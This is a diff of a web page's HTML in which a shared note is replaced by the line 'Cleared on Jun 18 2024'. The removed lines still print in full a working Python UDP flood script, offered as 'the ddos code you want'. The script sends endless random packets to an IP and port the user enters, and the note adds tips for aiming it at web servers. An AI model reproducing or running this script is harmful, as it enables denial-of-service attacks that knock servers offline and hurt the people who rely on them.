@@ -9,54 +9,7 @@
   <div class="main">
     <article class="article">
       <div class="content markdown-body">
-        <h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="Hello_0"></a>Hello</h1>
-<p class="has-line-data" data-line-start="1" data-line-end="2">This is the ddos code you want:</p>
-<pre><code class="has-line-data" data-line-start="3" data-line-end="45" class="language-py"><span class="hljs-keyword">import</span> sys
-<span class="hljs-keyword">import</span> os
-<span class="hljs-keyword">import</span> time
-<span class="hljs-keyword">import</span> socket
-<span class="hljs-keyword">import</span> random
-<span class="hljs-keyword">import</span> time
-<span class="hljs-comment">#Code Time</span>
-<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-
-<span class="hljs-comment">##############</span>
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(<span class="hljs-number">1490</span>)
-<span class="hljs-comment">#############</span>
-
-print()
-print(<span class="hljs-string">"Author   : TheEndlessV"</span>)
-print()
-
-ip = input(<span class="hljs-string">"IP Target : "</span>)
-port = input(<span class="hljs-string">"Port       : "</span>)
-
-port = int(port)
-
-print(<span class="hljs-string">"DDos Attack start in 3 seconds..."</span>)
-time.sleep(<span class="hljs-number">3</span>)
-sent = <span class="hljs-number">0</span>
-
-<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + <span class="hljs-number">1</span>
-     print(<span class="hljs-string">"Sent %s packet to %s throught port:%s"</span>%(sent,ip,port))
-
-print()
-print(<span class="hljs-string">"----DDos Attack End----"</span>)
-
-</code></pre>
-<p class="has-line-data" data-line-start="45" data-line-end="49">Please make sure you have headers needed.<br>
-You must input an ip address, not a domain/url.<br>
-For <strong>Port</strong> input, it’s often 80 for web server.<br>
-If got problems, just let me know on teams.</p>
+        <p>Cleared on Jun 18 2024</p>
       </div>
     </article>
   </div>
